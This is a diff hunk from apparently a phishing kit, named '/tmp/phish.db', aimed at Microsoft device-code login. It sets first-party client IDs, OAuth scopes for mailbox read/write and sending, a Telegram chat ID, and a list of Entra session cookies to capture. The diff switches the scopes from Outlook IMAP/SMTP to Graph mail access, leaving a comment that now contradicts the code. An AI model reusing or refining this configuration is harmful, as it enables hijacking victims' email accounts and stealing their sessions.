@@ -15,15 +15,12 @@ TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
 CLIENT_IDS = [
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office (works with IMAP/SMTP scopes)
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI (fallback)
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell (fallback)
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",
 ]
 CLIENT_ID_INDEX = 0
 
 # IMPORTANT: Outlook resource ONLY. No graph.microsoft.com — mixing resources causes AADSTS65002.
-DEVICE_CODE_SCOPE = "offline_access https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send"
-
+DEVICE_CODE_SCOPE = "offline_access https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/User.Read"
 COOKIE_WANTED = [
     "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
     "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
